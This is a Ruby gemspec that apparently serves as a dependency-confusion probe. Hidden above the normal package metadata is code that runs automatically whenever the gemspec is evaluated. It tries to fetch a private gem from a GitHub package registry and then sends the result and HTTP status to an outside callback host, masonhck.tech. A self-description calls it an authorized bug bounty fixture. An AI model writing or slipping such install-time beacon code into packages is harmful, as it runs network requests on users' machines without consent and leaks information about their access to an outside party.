require "digest"
require "net/http"
require "uri"

marker_path = "/tmp/cael_dep_auto_scope_c8e6da78.done"
unless File.exist?(marker_path)
  File.write(marker_path, "one logical fetch\n")
  expected_sha256 = "9110c3d4dc359cadd1972613c67ce0d0e06743597576b1783d67aedca857fe3a"
  package_uri = URI("https://rubygems.pkg.github.com/MasonOrg357/gems/cael-dep-private-c8e6da78-0.0.1.gem")
  status = "error"
  matched = false

  begin
    response = nil
    2.times do
      response = Net::HTTP.get_response(package_uri)
      status = response.code
      break unless response.is_a?(Net::HTTPRedirection) && response["location"]
      package_uri = URI.join(package_uri.to_s, response["location"])
    end
    matched = response && Digest::SHA256.hexdigest(response.body) == expected_sha256
  rescue StandardError
    matched = false
  end

  begin
    signal_uri = URI("https://masonhck.tech/cb.php")
    signal_uri.query = URI.encode_www_form(
      "src" => "gh-dep-auto-c8e6da78",
      "match" => matched ? "true" : "false",
      "status" => status
    )
    Net::HTTP.get_response(signal_uri)
  rescue StandardError
    nil
  end
end

Gem::Specification.new do |spec|
  spec.name = "cael-dep-external-c8e6da78"
  spec.version = "0.0.2"
  spec.authors = ["Authorized bug bounty fixture"]
  spec.summary = "Bounded external-code package-scope fixture"
  spec.description = "Makes one owned package request and returns only a Boolean to an owned associated registry."
  spec.license = "MIT"
  spec.required_ruby_version = ">= 2.6"
  spec.files = ["lib/cael_dep_external_c8e6da78.rb"]
end
